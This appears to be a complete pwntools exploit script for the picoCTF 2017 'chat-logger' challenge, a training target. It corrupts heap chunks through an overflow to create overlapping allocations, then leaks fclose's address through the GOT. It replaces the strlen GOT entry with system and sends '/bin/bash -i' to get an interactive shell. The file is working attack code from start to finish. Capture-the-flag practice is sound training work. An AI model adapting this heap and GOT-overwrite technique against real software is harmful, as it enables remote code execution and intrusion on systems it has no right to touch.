#!/usr/bin/env python

# @author GuilT

from pwn import *
import sys


if len(sys.argv) > 1:
    conn = remote('shell2017.picoctf.com', 20966)
    ofst = 0x28150
else:
    conn = process('./chat-logger')
    ofst = 0x28150
    #gdb.attach(conn)
    
def mychat(chatid):
    conn.sendline('chat %d' % (chatid))
    resp = conn.recvuntil('> ')
    print '%r' % resp
    return resp    

def myfind(chatid, needle):
    conn.sendline('find %d %s' % (chatid, needle))
    print conn.recvuntil('> ')
    
def myedit(newtxt):
    conn.sendline('edit %s' % (newtxt))
    print conn.recvuntil('> ')
    
def myadd(uid, newtxt):
    conn.sendline('add %d %s' % (uid, newtxt))
    print conn.recvuntil('> ')

def myquit():
    conn.sendline('quit')
    
# create chunks A, B and C    
conn.recvuntil('> ')
myfind(1,'ello') # message is 64 long
myedit('A' * 0x20)
myfind(1,'Sure.')
myedit('B' * 0xa0)
myadd(1, 'C' * 0x80)


#free chunk B
myfind(1,'BBBBBBBBBB') # message is 64 long
myedit('B' * 0xf8)


#overflow chunk A to overflow chunk B's size to fake its bigger
myfind(1,'AAAAAAAAAA')
myedit(cyclic(0x20-2) + 'QQQQQQQQ' + '\xe1') 

#Leak strlen
#trigger bug and alloc an overlapping chunk
strlen_got = 0x601e48
myfind(1,'revoir')

#many writes to push null bytes
myedit('P' * (0xd0-2))   #will point to a chunk at
myedit(cyclic(0xa0-2) + 'KKKKKKKK' + 'LLLLLLLL' + 'MMMMMMMM' + 'NNNNNNNN' + 'OOOOOOOO' + 'SSSSSSS')   #push null bytes
myedit(cyclic(0xa0-2) + 'KKKKKKKK' + 'LLLLLLLL' + 'MMMMMMMM' + 'NNNNNNNN' + 'OOOOOOOO' + 'SSSSSS')
myedit(cyclic(0xa0-2) + 'KKKKKKKK' + 'LLLLLLLL' + 'MMMMMMMM' + 'NNNNNNNN' + 'OOOOOOOO' + 'SSSSS')  
myedit(cyclic(0xa0-2) + 'KKKKKKKK' + 'LLLLLLLL' + 'MMMMMMMM' + 'NNNNNNNN' + 'OOOOOOOO' + 'SSSS')
myedit(cyclic(0xa0-2) + 'KKKKKKKK' + 'LLLLLLLL' + 'MMMMMMMM' + 'NNNNNNNN' + 'OOOOOOOO' + '\x40\x1f\x60')   #will point to a node in the rooms struct on the bss
myedit(cyclic(0xa0-2) + 'KKKKKKKK' + 'LLLLLLLL' + 'MMMMMMMM' + 'NNNNNNNN' + 'OOOOOOO')    #push null bytes
myedit(cyclic(0xa0-2) + 'KKKKKKKK' + 'LLLLLLLL' + 'MMMMMMMM' + 'NNNNNNNN' + 'OOOOOO')  
myedit(cyclic(0xa0-2) + 'KKKKKKKK' + 'LLLLLLLL' + 'MMMMMMMM' + 'NNNNNNNN' + 'OOOOO')  
myedit(cyclic(0xa0-2) + 'KKKKKKKK' + 'LLLLLLLL' + 'MMMMMMMM' + 'NNNNNNNN' + 'OOOO')  

#Leak fclose
myedit(cyclic(0xa0-2) + 'KKKKKKKK' + 'LLLLLLLL' + 'MMMMMMMM' + 'NNNNNNNN' + '\x40\x1e\x60')   #will point the msg at fclose_got
resp = mychat(1)
start = resp.find('5570193308531903821 ') + len('5570193308531903821 ')
fclose_addr = u64(resp[start:start + 6] + '\x00\x00')
log.success('fclose_addr = 0x%x' % fclose_addr)


system_addr = fclose_addr - ofst
log.success('system_addr = 0x%x' % system_addr)

#replace strlen by system
log.info('finding %r' % p64(fclose_addr).replace('\x00',''))
myfind(1,p64(fclose_addr).replace('\x00',''))
myedit('AAAAAA' + p64(system_addr).replace('\x00',''))   #will point at fclose_got but strlen_got follows fclose_got.

# when sending something, strlen is the first api call done on the string so it will now call system('/bin/sh')
conn.sendline('/bin/bash -i')

conn.interactive()